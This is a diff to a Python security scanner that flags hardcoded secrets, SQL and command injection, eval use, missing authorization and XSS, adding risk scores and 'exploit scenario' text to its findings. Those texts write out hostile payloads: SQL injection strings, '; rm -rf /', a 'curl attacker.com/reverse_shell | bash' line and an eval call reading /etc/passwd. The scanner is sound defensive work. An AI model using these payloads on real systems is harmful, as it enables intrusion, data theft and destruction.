@@ -5,6 +5,7 @@ Deterministic, generation-time static analysis combining:
 2. AST (Abstract Syntax Tree) taint & syntax analysis for injection flaws
 3. Route authorization and access control validation
 4. Compiler-level AST Node Hierarchy Extractor
+5. Dynamic Risk Scoring & Exploit Threat Scenarios
 """
 
 import ast
@@ -52,12 +53,26 @@ class VibeGuardScanner:
 
         elapsed_ms = (time.perf_counter() - start_time) * 1000.0
 
-        has_critical = any(f["severity"] == "CRITICAL" for f in findings)
-        has_high = any(f["severity"] == "HIGH" for f in findings)
-        status = "VULNERABLE" if (has_critical or has_high) else ("WARNING" if findings else "CLEAN")
+        crit_count = sum(1 for f in findings if f.get("severity") == "CRITICAL")
+        high_count = sum(1 for f in findings if f.get("severity") == "HIGH")
+        med_count = sum(1 for f in findings if f.get("severity") == "MEDIUM")
+
+        if crit_count > 0:
+            risk_score = min(99, 65 + crit_count * 15 + high_count * 5)
+            status = "VULNERABLE"
+        elif high_count > 0:
+            risk_score = min(75, 40 + high_count * 15)
+            status = "VULNERABLE"
+        elif med_count > 0 or findings:
+            risk_score = min(40, 20 + med_count * 10)
+            status = "WARNING"
+        else:
+            risk_score = 0
+            status = "CLEAN"
 
         return {
             "status": status,
+            "risk_score": risk_score,
             "latency_ms": round(elapsed_ms, 2),
             "findings_count": len(findings),
             "findings": findings,
@@ -77,13 +92,22 @@ class VibeGuardScanner:
                     findings.append({
                         "id": f"VG-SEC-{secret_type}",
                         "cwe": "CWE-798",
+                        "cwe_name": "Use of Hard-coded Credentials",
+                        "cvss_score": 9.8,
                         "title": f"Hardcoded Secret / API Key ({secret_type})",
                         "line": idx,
                         "severity": "CRITICAL",
                         "snippet": line.strip(),
                         "entropy": round(entropy, 2),
-                        "description": f"Exposed secret detected on line {idx}.",
-                        "fix_suggestion": "Extract the secret into an environment variable."
+                        "description": f"Exposed high-privilege {secret_type} literal embedded directly in source code.",
+                        "why_unsafe": "Private API keys and service tokens must never reside in client-accessible code or version control repositories.",
+                        "exploit_scenario": "An attacker extracting this credential from source control or client bundles can impersonate your production services, bypass database security barriers, and download or modify all proprietary data.",
+                        "fix_suggestion": "Extract the secret into an environment variable and load it via os.getenv() or process.env.",
+                        "taint_flow": {
+                            "source": f"Hardcoded literal: '{secret_type}'",
+                            "intermediate": "Plaintext source code in repository",
+                            "sink": "Third-party service authentication client"
+                        }
                     })
 
             string_literals = re.findall(r"['\"]([a-zA-Z0-9_\-\.]{24,})['\"]", line)
@@ -94,13 +118,22 @@ class VibeGuardScanner:
                         findings.append({
                             "id": "VG-SEC-HIGH-ENTROPY",
                             "cwe": "CWE-798",
+                            "cwe_name": "High-Entropy Hard-coded Secret",
+                            "cvss_score": 9.1,
                             "title": "High-Entropy Suspicious Literal Detected",
                             "line": idx,
                             "severity": "CRITICAL",
                             "snippet": line.strip(),
                             "entropy": round(entropy, 2),
-                            "description": f"Detected string with Shannon Entropy of {round(entropy, 2)}.",
-                            "fix_suggestion": "Move token to .env.local configuration file."
+                            "description": f"Detected string with high Shannon Entropy ({round(entropy, 2)} bits/char), indicating an unmanaged secret token.",
+                            "why_unsafe": "High-entropy random strings typically represent active session signing secrets, private keys, or API tokens.",
+                            "exploit_scenario": "Attackers run automated secret scrapers to harvest high-entropy strings, using them to forge JWT signatures or gain unauthorized administrative API access.",
+                            "fix_suggestion": "Move token to .env.local configuration file and reference through environment variables.",
+                            "taint_flow": {
+                                "source": f"High-entropy literal (Entropy: {round(entropy, 2)})",
+                                "intermediate": "Inlined code constant",
+                                "sink": "Runtime application state"
+                            }
                         })
 
         return findings
@@ -130,14 +163,18 @@ class VibeGuardScanner:
                             self.local_findings.append({
                                 "id": "VG-INJ-SQLI",
                                 "cwe": "CWE-89",
+                                "cwe_name": "Improper Neutralization of Special Elements used in an SQL Command",
+                                "cvss_score": 8.8,
                                 "title": "SQL Injection via String Concatenation",
                                 "line": node.lineno,
                                 "severity": "HIGH",
-                                "description": "Database query constructed using string concatenation.",
-                                "fix_suggestion": "Use parameterized queries ($1, ? or :param).",
+                                "description": "Database query constructed using unsanitized string concatenation with binary operator (+).",
+                                "why_unsafe": "Dynamic string concatenation allows user-supplied parameters to alter the lexical structure of the SQL query before execution.",
+                                "exploit_scenario": "An attacker can submit `' OR '1'='1` or `'; DROP TABLE users; --` to bypass login authentication, read password hashes, or wipe entire database tables.",
+                                "fix_suggestion": "Use parameterized queries with placeholder bindings ($1, ? or :param).",
                                 "taint_flow": {
                                     "source": "Untrusted request parameter",
-                                    "intermediate": "String concatenation BinOp (+)",
+                                    "intermediate": "ast.BinOp string concatenation (+)",
                                     "sink": f"Database execution sink: {func_name}()"
                                 }
                             })
@@ -145,11 +182,15 @@ class VibeGuardScanner:
                             self.local_findings.append({
                                 "id": "VG-INJ-SQLI-FSTRING",
                                 "cwe": "CWE-89",
+                                "cwe_name": "SQL Injection via Formatted String (f-string)",
+                                "cvss_score": 8.8,
                                 "title": "SQL Injection via Formatted String (f-string)",
                                 "line": node.lineno,
                                 "severity": "HIGH",
-                                "description": "Raw SQL query uses interpolated f-string.",
-                                "fix_suggestion": "Pass query parameters separately to database driver.",
+                                "description": "Raw SQL query uses interpolated Python f-string instead of parameterized query binding.",
+                                "why_unsafe": "f-strings evaluate expressions at runtime prior to database submission, allowing malicious syntax injection.",
+                                "exploit_scenario": "An attacker submitting `' UNION SELECT username, password_hash, email FROM users --` forces the query to return private database records directly to the client.",
+                                "fix_suggestion": "Pass query parameters separately to the database driver as bind parameters.",
                                 "taint_flow": {
                                     "source": "Interpolated f-string variable",
                                     "intermediate": "ast.JoinedStr dynamic evaluation",
@@ -162,13 +203,17 @@ class VibeGuardScanner:
                         self.local_findings.append({
                             "id": "VG-INJ-RCE",
                             "cwe": "CWE-78",
+                            "cwe_name": "Improper Neutralization of Special Elements used in an OS Command",
+                            "cvss_score": 9.8,
                             "title": "Command Injection Risk via Dynamic Shell Execution",
                             "line": node.lineno,
                             "severity": "CRITICAL",
-                            "description": "System command execution with dynamic user input leads to RCE.",
-                            "fix_suggestion": "Avoid shell=True and pass command arguments as a list.",
+                            "description": "Operating system command executed using dynamically constructed shell strings.",
+                            "why_unsafe": "Shell interpreters treat metacharacters (;, |, &, `) as command delimiters, executing chained arbitrary commands.",
+                            "exploit_scenario": "An attacker injecting `; rm -rf /` or `| curl attacker.com/reverse_shell | bash` gains complete remote shell control over the server.",
+                            "fix_suggestion": "Avoid shell=True and pass command arguments safely as an array of strings to subprocess.run().",
                             "taint_flow": {
-                                "source": "User command arguments",
+                                "source": "Dynamic input variable",
                                 "intermediate": "Direct shell interpolation",
                                 "sink": f"OS execution sink: os.{func_name}()"
                             }
@@ -178,11 +223,15 @@ class VibeGuardScanner:
                     self.local_findings.append({
                         "id": "VG-RCE-EVAL",
                         "cwe": "CWE-95",
+                        "cwe_name": "Arbitrary Code Execution via Dynamic eval()/exec()",
+                        "cvss_score": 9.8,
                         "title": "Arbitrary Code Execution via eval() / exec()",
                         "line": node.lineno,
                         "severity": "CRITICAL",
-                        "description": "Dynamic evaluation of untrusted code leads to system compromise.",
-                        "fix_suggestion": "Refactor logic to use safe parsers like json.loads.",
+                        "description": "Dynamic evaluation of untrusted expression strings allows arbitrary Python code execution.",
+                        "why_unsafe": "eval() compiles and runs any Python expression with the full privileges of the host process.",
+                        "exploit_scenario": "An attacker supplying `__import__('os').system('cat /etc/passwd')` executes arbitrary commands and reads private server files.",
+                        "fix_suggestion": "Refactor logic to use safe parsers like json.loads() or ast.literal_eval().",
                         "taint_flow": {
                             "source": "Untrusted user expression string",
                             "intermediate": "Dynamic code evaluator",
@@ -195,7 +244,7 @@ class VibeGuardScanner:
             def visit_FunctionDef(self, node):
                 func_name_lower = node.name.lower()
                 is_mutating = any(action in func_name_lower for action in ["delete", "update", "patch", "modify", "remove"])
-                
+
                 has_auth = False
                 for decorator in node.decorator_list:
                     d_name = ""
@@ -214,11 +263,15 @@ class VibeGuardScanner:
                     self.local_findings.append({
                         "id": "VG-AUTH-IDOR",
                         "cwe": "CWE-285",
+                        "cwe_name": "Improper Authorization / Insecure Direct Object Reference (IDOR)",
+                        "cvss_score": 7.5,
                         "title": "Missing Access Control on Mutating Endpoint (IDOR)",
                         "line": node.lineno,
                         "severity": "HIGH",
-                        "description": f"Endpoint '{node.name}' performs mutations without verifying authorization.",
-                        "fix_suggestion": "Add authentication dependency / session check.",
+                        "description": f"Endpoint '{node.name}' performs mutating operations without verifying caller session or ownership.",
+                        "why_unsafe": "Mutating state without authenticating the requesting user allows unauthorized data manipulation.",
+                        "exploit_scenario": "An unauthenticated attacker or authenticated user can supply arbitrary entity IDs to delete or modify records owned by other users.",
+                        "fix_suggestion": "Add an authentication dependency guard verifying user session identity before processing mutations.",
                         "taint_flow": {
                             "source": f"HTTP Mutation Route /{node.name}",
                             "intermediate": "Direct invocation without session assertion",
@@ -243,12 +296,16 @@ class VibeGuardScanner:
                     findings.append({
                         "id": "VG-INJ-SQLI-JS",
                         "cwe": "CWE-89",
+                        "cwe_name": "SQL Injection via Concatenation / Template Literal",
+                        "cvss_score": 8.8,
                         "title": "SQL Injection via Concatenation / Template Literal",
                         "line": idx,
                         "severity": "HIGH",
                         "snippet": line.strip(),
-                        "description": "Database query constructed using unescaped request input.",
-                        "fix_suggestion": "Use parameterized queries or ORM prepared statements.",
+                        "description": "Database query constructed using unescaped request input in template literal or concatenation.",
+                        "why_unsafe": "Directly interpolating client request fields into raw SQL queries creates arbitrary SQL injection vectors.",
+                        "exploit_scenario": "An attacker supplies crafted query strings to alter SQL logic, bypass access controls, or extract sensitive database tables.",
+                        "fix_suggestion": "Use parameterized queries ($1, $2) or ORM prepared statements.",
                         "taint_flow": {
                             "source": "req.params / req.body",
                             "intermediate": "Template literal interpolation (${...})",
@@ -261,11 +318,15 @@ class VibeGuardScanner:
                     findings.append({
                         "id": "VG-AUTH-UNPROTECTED-ROUTE",
                         "cwe": "CWE-306",
+                        "cwe_name": "Missing Authentication for Critical Function",
+                        "cvss_score": 7.5,
                         "title": "Unauthenticated API Mutation Route (Missing Auth Guard)",
                         "line": idx,
                         "severity": "HIGH",
                         "snippet": line.strip(),
                         "description": "API route handles sensitive modifications without authentication middleware.",
+                        "why_unsafe": "Exposing mutating endpoints without verifying caller authentication permits unauthorized manipulation.",
+                        "exploit_scenario": "Any unauthenticated user on the Internet can invoke this endpoint to mutate application state.",
                         "fix_suggestion": "Mount an authentication middleware handler on the route.",
                         "taint_flow": {
                             "source": "Public HTTP endpoint",
@@ -279,12 +340,16 @@ class VibeGuardScanner:
                     findings.append({
                         "id": "VG-XSS-UNSANITIZED",
                         "cwe": "CWE-79",
+                        "cwe_name": "Improper Neutralization of Input During Web Page Generation (XSS)",
+                        "cvss_score": 8.2,
                         "title": "Cross-Site Scripting (XSS) via Unsanitized HTML",
                         "line": idx,
                         "severity": "HIGH",
                         "snippet": line.strip(),
-                        "description": "Direct insertion of unsanitized HTML into DOM permits script execution.",
-                        "fix_suggestion": "Pass raw strings through DOMPurify.sanitize().",
+                        "description": "Direct insertion of unsanitized HTML into DOM permits client-side script execution.",
+                        "why_unsafe": "Injecting unsanitized user content into innerHTML enables execution of malicious JavaScript.",
+                        "exploit_scenario": "An attacker injects `<script>` payloads or `<img>` onerror handlers to steal session tokens and perform actions as the victim.",
+                        "fix_suggestion": "Pass raw strings through DOMPurify.sanitize() before DOM insertion.",
                         "taint_flow": {
                             "source": "Untrusted HTML input string",
                             "intermediate": "Raw unescaped rendering",
